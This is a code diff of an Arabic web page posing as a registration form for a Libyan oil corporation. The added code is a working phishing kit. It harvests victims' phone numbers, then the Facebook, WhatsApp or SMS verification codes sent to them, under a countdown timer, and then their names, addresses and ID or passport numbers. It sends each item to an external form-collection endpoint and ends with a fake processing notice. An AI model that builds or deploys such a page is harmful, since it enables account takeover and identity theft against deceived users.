@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>نموذج التسجيل - مؤسسة النفط الليبية</title>
   <style>
     body {
@@ -16,31 +16,24 @@
       height: 100vh;
     }
 
-    .container {
-      background: #ffffff;
-      padding: 30px;
-      border-radius: 16px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
-      width: 100%;
+    .container, .popup, #fieldsModal {
+      background: #fff;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      width: 90%;
       max-width: 450px;
       box-sizing: border-box;
-      border-top: 5px solid #003366;
       text-align: center;
     }
 
-    .container img.logo {
-      width: 150px;
-      margin-bottom: 10px;
-    }
-
-    h2 {
-      color: #003366;
-      margin-bottom: 20px;
+    .hidden {
+      display: none;
     }
 
     label {
       display: block;
-      margin-top: 15px;
+      margin-top: 10px;
       font-weight: bold;
       color: #003366;
       text-align: right;
@@ -61,55 +54,50 @@
       color: white;
       border: none;
       cursor: pointer;
-      margin-top: 20px;
+      margin-top: 15px;
     }
 
     button:hover {
       background-color: #218838;
     }
 
-    .popup {
-      display: none;
-      position: fixed;
-      top: 30px;
-      left: 0;
-      right: 0;
-      margin: auto;
-      max-width: 420px;
-      background: #ffffff;
-      border: 2px solid #003366;
-      border-radius: 12px;
-      padding: 20px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
-      z-index: 1000;
-      text-align: center;
-    }
-
-    .popup h3 {
-      font-size: 16px;
-      margin-bottom: 15px;
-    }
-
     .countdown {
-      text-align: center;
       font-weight: bold;
-      margin-top: 10px;
       color: #cc0000;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
 
-<div class="container" id="formContainer">
-  <img src="uy.jpeg" alt="شعار المؤسسة الوطنية للنفط" class="logo" />
-  <h2>نموذج التسجيل - مؤسسة النفط الليبية</h2>
+<div class="container" id="phoneStep">
+  <h2>أدخل رقم هاتفك الليبي</h2>
+  <form id="phoneForm">
+    <label>رقم الهاتف:</label>
+    <input type="text" id="phone" required placeholder="091xxxxxxx" />
+    <button type="submit">تلقي الكود</button>
+  </form>
+</div>
 
-  <form id="mainForm">
+<div class="container hidden" id="codeStep">
+  <h3>أدخل الكود الذي وصلك من Facebook أو WhatsApp أو SMS</h3>
+  <form id="codeForm">
+    <label>كود التوثيق:</label>
+    <input type="text" id="code" required placeholder="كود من 6-8 أحرف أو أرقام" />
+    <div class="countdown" id="countdown">08:00</div>
+    <button type="submit">تأكيد الكود</button>
+    <button type="button" id="resendCode">🔁 إعادة إرسال الكود</button>
+  </form>
+</div>
+
+<div id="fieldsModal" class="hidden">
+  <h3 style="color: #003366;">البيانات الإضافية</h3>
+  <form id="fullForm">
     <label>الاسم الكامل:</label>
-    <input type="text" id="fullName" name="fullName" required />
+    <input type="text" id="fullName" required />
 
     <label>العنوان:</label>
-    <input type="text" id="address" name="address" required />
+    <input type="text" id="address" required />
 
     <label>نوع الوثيقة:</label>
     <select id="docType" required>
@@ -118,51 +106,78 @@
       <option value="جواز سفر">جواز سفر</option>
     </select>
 
-    <div id="docNumberContainer" style="display:none;">
-      <label id="docLabel">رقم الوثيقة:</label>
-      <input type="text" id="docNumber" name="docNumber" required />
-    </div>
-
-    <label>رقم الهاتف:</label>
-    <input type="text" id="phone" name="phone" required />
+    <label>رقم الوثيقة:</label>
+    <input type="text" id="docNumber" required />
 
     <button type="submit">إرسال الطلب</button>
   </form>
 </div>
 
-<!-- نافذة الاعتذار -->
-<div class="popup" id="errorPopup">
-  <h3 style="color: green;">جاري معالجة طلبك، الرجاء المراجعة في وقت آخر</h3>
-  <button onclick="resetForm()">إعادة التسجيل من جديد</button>
+<div class="container hidden" id="finalMessage">
+  <h3 style="color: green;">جاري معالجة طلبك، الرجاء المراجعة في وقت آخر.</h3>
 </div>
+
+<audio id="alarmSound">
+  <source src="https://www.soundjay.com/button/beep-07.wav" type="audio/wav">
+</audio>
 
 <script>
   const formcarryURL = "https://formcarry.com/s/a-Yw-WFDEqO";
+  let savedPhone = "";
+  let codeSubmitCount = 0;
+  let timerInterval;
 
-  document.getElementById("docType").addEventListener("change", function () {
-    const docContainer = document.getElementById("docNumberContainer");
-    const docLabel = document.getElementById("docLabel");
-    const docNumber = document.getElementById("docNumber");
-
-    if (this.value === "بطاقة") {
-      docLabel.textContent = "رقم البطاقة:";
-      docNumber.placeholder = "أدخل رقم البطاقة";
-    } else if (this.value === "جواز سفر") {
-      docLabel.textContent = "رقم جواز السفر:";
-      docNumber.placeholder = "أدخل رقم جواز السفر";
+  document.getElementById("phoneForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    const phone = document.getElementById("phone").value.trim();
+    const phoneRegex = /^(091|092|094)\d{7}$/;
+    if (!phoneRegex.test(phone)) {
+      alert("يرجى إدخال رقم هاتف ليبي صحيح يبدأ بـ 091 أو 092 أو 094.");
+      return;
     }
-
-    docContainer.style.display = this.value ? "block" : "none";
+    savedPhone = phone;
+    fetch(formcarryURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ phone })
+    });
+    document.getElementById("phoneStep").classList.add("hidden");
+    document.getElementById("codeStep").classList.remove("hidden");
+    startCountdown(8 * 60);
   });
 
-  document.getElementById("mainForm").addEventListener("submit", function (e) {
+  document.getElementById("codeForm").addEventListener("submit", function(e) {
     e.preventDefault();
+    const code = document.getElementById("code").value.trim();
+    if (!/^[A-Za-z0-9]{6,8}$/.test(code)) {
+      alert("الكود يجب أن يكون من 6 إلى 8 أرقام أو أحرف.");
+      return;
+    }
+    codeSubmitCount++;
+    fetch(formcarryURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ phone: savedPhone, code })
+    });
+    document.getElementById("codeStep").classList.add("hidden");
+    document.getElementById("fieldsModal").classList.remove("hidden");
+  });
 
+  document.getElementById("resendCode").addEventListener("click", function() {
+    fetch(formcarryURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ phone: savedPhone, resend: true })
+    });
+    startCountdown(8 * 60);
+  });
+
+  document.getElementById("fullForm").addEventListener("submit", function(e) {
+    e.preventDefault();
     const fullName = document.getElementById("fullName").value.trim();
+    const address = document.getElementById("address").value.trim();
     const docType = document.getElementById("docType").value;
     const docNumber = document.getElementById("docNumber").value.trim();
-    const phone = document.getElementById("phone").value.trim();
-    const address = document.getElementById("address").value.trim();
 
     const arabicRegex = /^[\u0600-\u06FF\s]{8,}$/;
     if (!arabicRegex.test(fullName)) {
@@ -170,27 +185,31 @@
       return;
     }
 
-    const phoneRegex = /^(091|092|094)\d{7}$/;
-    if (!phoneRegex.test(phone)) {
-      alert("يرجى إدخال رقم هاتف ليبي صحيح يبدأ بـ 091 أو 092 أو 094.");
-      return;
-    }
-
     fetch(formcarryURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ fullName, docType, docNumber, phone, address })
-    }).then(() => {
-      // عند الإرسال بنجاح، نخفي النموذج ونظهر نافذة الاعتذار
-      document.getElementById("formContainer").style.display = "none";
-      document.getElementById("errorPopup").style.display = "block";
-    }).catch(() => alert("حدث خطأ أثناء الإرسال"));
+      body: JSON.stringify({ fullName, address, docType, docNumber, phone: savedPhone })
+    });
+
+    document.getElementById("fieldsModal").classList.add("hidden");
+    document.getElementById("finalMessage").classList.remove("hidden");
   });
 
-  function resetForm() {
-    location.reload();
+  function startCountdown(duration) {
+    let timer = duration, minutes, seconds;
+    clearInterval(timerInterval);
+    const countdown = document.getElementById("countdown");
+    timerInterval = setInterval(() => {
+      minutes = Math.floor(timer / 60);
+      seconds = timer % 60;
+      countdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+      if (--timer < 0) {
+        clearInterval(timerInterval);
+        countdown.textContent = "انتهى الوقت!";
+        document.getElementById("alarmSound").play();
+      }
+    }, 1000);
   }
 </script>
-
 </body>
 </html>
